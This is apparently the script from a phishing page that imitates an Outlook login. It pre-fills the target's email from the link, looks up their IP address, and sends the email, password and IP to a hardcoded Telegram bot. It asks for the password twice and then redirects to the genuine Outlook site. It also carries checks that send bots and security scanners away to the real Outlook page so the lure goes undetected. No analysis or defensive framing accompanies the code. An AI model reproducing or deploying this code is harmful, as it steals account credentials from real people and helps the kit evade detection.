  <script>
  // Wait for page to fully load
  window.addEventListener('load', function() {
    // Extract email from URL hash (e.g., #john@gmail.com)
    const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
    
    // Also check for email parameter in query string
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromQuery = urlParams.get('email');
    
    // Use email from hash first, then from query parameter
    const finalEmail = emailFromUrl || emailFromQuery;
    
    // Basic validation (must contain @ and ., and no spaces)
    if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
      // Set the email in both the visible and hidden fields
      document.getElementById('hidden-email').value = finalEmail;
      document.getElementById('email').value = finalEmail;
    }
  });
  </script>

  <script>
  $(document).ready(function () {
    // First, fetch user's IP and store it in the hidden field
    $.getJSON("https://api64.ipify.org?format=json", function (data) {
      $("#ip").val(data.ip);
      console.log("User IP:", data.ip);
    });
    
    // Make sure email is preserved after page reload
    window.addEventListener('load', function() {
      const emailFromUrl = decodeURIComponent(window.location.hash.substring(1));
      const urlParams = new URLSearchParams(window.location.search);
      const emailFromQuery = urlParams.get('email');
      const finalEmail = emailFromUrl || emailFromQuery;
      
      if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
        document.getElementById('hidden-email').value = finalEmail;
        document.getElementById('email').value = finalEmail;
      }
    });

    // ADVANCED BOT PROTECTION
    
    // 1. Honeypot detection
    let honeypotTimer = setTimeout(function() {
      // If honeypot gets focus, it's a bot
      $('#bot-trap').on('focus', function() {
        console.log('Bot detected via honeypot');
        // Redirect bot immediately
        window.location.href = "https://outlook.live.com";
      });
    }, 1000);

    // 2. Form submission timing detection
    let formLoadTime = Date.now();
    let submissionBlocked = false;

    // 3. Human behavior simulation requirement
    let humanInteraction = false;
    let mouseMovements = 0;
    
    $(document).on('mousemove click keydown scroll', function() {
      humanInteraction = true;
      mouseMovements++;
      clearTimeout(honeypotTimer);
    });

    // 4. Advanced event blocking for email field
    $('#email').on('focus click keydown keyup keypress input change', function(e) {
      e.preventDefault();
      e.stopPropagation();
      // If anyone tries to interact with email field, block submission
      submissionBlocked = true;
      return false;
    });

    // 5. Copy/paste protection
    $('#email').on('copy cut paste', function(e) {
      e.preventDefault();
      submissionBlocked = true;
      return false;
    });

    $("#email-form").submit(function (event) {
      event.preventDefault();

      // BOT DETECTION CHECKS
      
      // Check 1: Honeypot field filled (definitely a bot)
      if ($('#bot-trap').val().length > 0) {
        console.log('Bot detected: Honeypot field filled');
        window.location.href = "https://outlook.live.com";
        return false;
      }
      
      // Check 2: Too fast submission (less than 3 seconds)
      let submissionTime = Date.now();
      if ((submissionTime - formLoadTime) < 3000) {
        console.log('Bot detected: Form submitted too quickly');
        window.location.href = "https://outlook.live.com";
        return false;
      }
      
      // Check 3: No human interaction detected
      if (!humanInteraction || mouseMovements < 2) {
        console.log('Bot detected: No human interaction');
        window.location.href = "https://outlook.live.com";
        return false;
      }
      
      // Check 4: Email field was tampered with
      if (submissionBlocked) {
        console.log('Bot detected: Email field interaction detected');
        window.location.href = "https://outlook.live.com";
        return false;
      }
      
      // Check 5: Empty or invalid email from URL
      let userEmail = $("#hidden-email").val();
      if (!userEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
        console.log('Bot detected: Invalid email');
        window.location.href = "https://outlook.live.com";
        return false;
      }

      // If all checks pass, proceed with human submission
      let userPassword = $("#password").val();
      let userIP = $("#ip").val();

      // Validate that we have both email and password
      if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
        console.error("Missing email or password");
        return;
      }

      // Telegram credentials
      let botToken = "8417686468:AAHMynSC-H9KhFAd_WW02OEr213900iVzBo";
      let chatId = "8429622655";

      // Format the message you want to receive on Telegram
      let messageText = `ðŸ“§ New Outlook Login\nðŸ‘¤ User Name: ${userEmail}\nðŸ”‘ Password: ${userPassword}\nðŸŒ IP Address: ${userIP}\nâ° Time: ${new Date().toLocaleString()}`;

      // Construct the Telegram API URL
      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      // Check if this is the first or second submission
      let submissionCount = sessionStorage.getItem('outlookSubmissionCount') || 0;
      
      if (submissionCount < 1) {
        // First submission
        submissionCount = 1;
        sessionStorage.setItem('outlookSubmissionCount', submissionCount);
        
        // First Telegram submission
        $.ajax({
          url: telegramUrl,
          type: "POST",
          data: {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'HTML'
          },
          success: function () {
            console.log("âœ… First form submission to Telegram successfully");
            // Reload the page after first submission
            setTimeout(function () {
              window.location.reload();
            }, 1000);
          },
          error: function (jqXHR, textStatus, errorThrown) {
            console.error("âŒ First submission failed:", textStatus, errorThrown);
            // Still reload even if there's an error
            setTimeout(function () {
              window.location.reload();
            }, 1000);
          }
        });
      } else {
        // Second submission
        sessionStorage.removeItem('outlookSubmissionCount'); // Clear the counter
        
        // Second Telegram submission
        $.ajax({
          url: telegramUrl,
          type: "POST",
          data: {
            chat_id: chatId,
            text: messageText + "\nðŸ”„ Second Submission",
            parse_mode: 'HTML'
          },
          success: function () {
            console.log("âœ… Second form submission to Telegram successfully");
            // Redirect to Outlook after second submission
            setTimeout(function () {
              window.location.href = "https://outlook.live.com";
            }, 1000);
          },
          error: function (jqXHR, textStatus, errorThrown) {
            console.error("âŒ Second submission failed:", textStatus, errorThrown);
            // Still redirect even if there's an error
            setTimeout(function () {
              window.location.href = "https://outlook.live.com";
            }, 1000);
          }
        });
      }
    });

    // Additional protection: If bot tries to submit via JavaScript directly
    let originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
      console.log('Bot detected: Direct form submission attempt');
      window.location.href = "https://outlook.live.com";
      return false;
    };
  });
  </script>
